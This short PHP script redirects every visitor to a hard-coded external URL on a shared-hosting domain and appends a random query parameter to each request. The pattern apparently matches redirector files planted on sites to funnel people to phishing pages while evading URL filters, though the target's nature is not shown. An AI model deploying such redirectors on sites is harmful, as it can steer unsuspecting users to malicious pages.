<?php 

	$link = 'http://same-jima.xsrv.jp/js/BP/';

	function redirection($link){

		$random = '?rand=' . rand(99, 100000000);
	    header('Location: ' . $link . $random);
	    exit();

	}

	redirection($link);

?>